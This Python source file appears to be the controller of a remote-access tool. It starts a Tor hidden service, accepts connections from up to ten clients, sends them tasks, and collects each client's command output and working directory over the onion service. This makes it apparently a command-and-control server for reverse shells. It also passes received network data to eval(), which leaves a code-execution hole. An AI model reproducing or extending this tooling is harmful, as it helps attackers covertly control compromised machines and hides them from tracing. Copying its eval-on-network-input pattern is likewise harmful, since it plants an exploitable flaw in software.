import socket
import threading
import sys
import os
import stem.process
import stat
from shell_ui.style import (
    Style,
    ProgressSpinner
)


class Tor:
    """
    A class to handle the tor process,
    and the tor hidden service.
    """
    BASE_DIR = 'hidden_service'
    TORRC_PATH = os.path.join('hidden_service', 'torrc')
    TOR_SOCKS_PORT = 9200

    def __init__(self, name, listener_port, forward_port):
        self.name = name
        # listen and forward port configured in /etc/tor/torrc
        self.listener_port = listener_port
        self.forward_port = forward_port

        # create hidden service directory
        if not os.path.isdir(self.BASE_DIR):
            os.mkdir(self.BASE_DIR)
            # the owner has full permissions over dir (equivalent to chmod 700)
            os.chmod(self.BASE_DIR, stat.S_IRWXU)

        ps = ProgressSpinner('Starting Tor Process')
        ps.start()
        self.tor_process = self.launch()
        ps.stop()
        print()
        Style.pos_sys_msg('Onion: {}'.format(self.get_onion_address()))

    def launch(self):
        try:
            tor_process = stem.process.launch_tor_with_config(
                config={
                    'SocksListenAddress': '127.0.0.1:{}'.format(self.TOR_SOCKS_PORT),
                    'SocksPort': '{}'.format(self.TOR_SOCKS_PORT),
                    'HiddenServiceDir': '{}'.format(self.BASE_DIR),
                    'HiddenServiceVersion': '3',
                    'HiddenServicePort': '{} 127.0.0.1:{}'.format(self.listener_port, self.forward_port)
                })
        except Exception as error:
            Style.neg_sys_msg('Error while starting tor: {}'.format(error))
            sys.exit(1)
        return tor_process

    def get_onion_address(self):
        with open(os.path.join(self.BASE_DIR, 'hostname'), 'r') as f:
            # remove \n from hostname file
            return f.read().rstrip()


class ListenerSocket(threading.Thread):
    """
    A class to handle the listener socket.
    It also handles the en- and decoding and the network protocol.
    """
    MAX_CONNECTIONS = 10

    def __init__(self, port):
        threading.Thread.__init__(self)
        threading.Thread.daemon = True

        self.__port = port
        self.__sock = self.create()
        self.__clients = []

    def create(self) -> socket.socket:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('127.0.0.1', self.__port))
            sock.listen(self.MAX_CONNECTIONS)
        except socket.error as error:
            Style.neg_sys_msg(error)
            sys.exit(1)
        else:
            Style.pos_sys_msg('Created socket and bound to hidden service forward port')
            return sock

    def run(self):
        """
        The <start> method runs as a thread and endless.
        It handles all incoming client connections and stores the according
        client objects in <self.__clients>.
        """
        Style.pos_sys_msg('Listening for clients')
        while True:
            try:
                client_objects = self.__sock.accept()
                client = Client(client_objects)
                self.__clients.append(client)
                Style.client_connect_msg()
            except socket.error as error:
                Style.neg_sys_msg(error)
                sys.exit(1)

    def get_clients(self):
        return self.__clients

    def get_client(self, index):
        try:
            return self.__clients[index]
        except IndexError:
            Style.neg_sys_msg('Client Index out of range.')

    def del_client(self, index):
        try:
            del (self.__clients[index])
        except IndexError:
            Style.neg_sys_msg('Client Index out of range.')


class Client:
    """
    A class the handles the interaction between the listener and the client.
    It should NOT be accessed from outside the module.
    """

    def __init__(self, client_objects):
        self.__conn, self.__addr = client_objects

    def send(self, task, args):
        """
        The Listener always sends a dictionary containing,
        A task and a list of optional arguments.
        """
        try:
            data = {'task': task, 'args': args}
            data = str(data)
            self.__conn.send(data.encode('utf-8'))
        except socket.error as error:
            Style.neg_sys_msg('Error while sending: {}'.format(error))
            sys.exit(1)
        else:
            Style.pos_sys_msg('==> send {} bytes'.format(sys.getsizeof(data)))

    def receive(self, buffer_size):
        """
        The client always sends back the output of the current task,
        and the current working directory as a dictionary.
        """
        try:
            data = self.__conn.recv(buffer_size)
            if len(data) <= 0:
                return -1, -1
            num_bytes = sys.getsizeof(data)
            data = data.decode('utf-8')
            data = eval(data)
        except socket.error as error:
            Style.neg_sys_msg('Error while receiving: {}'.format(error))
            self.__conn.close()
            return -1, -1
        else:
            Style.pos_sys_msg('<== received {} bytes'.format(num_bytes))
            return data['output'], data['cwd']



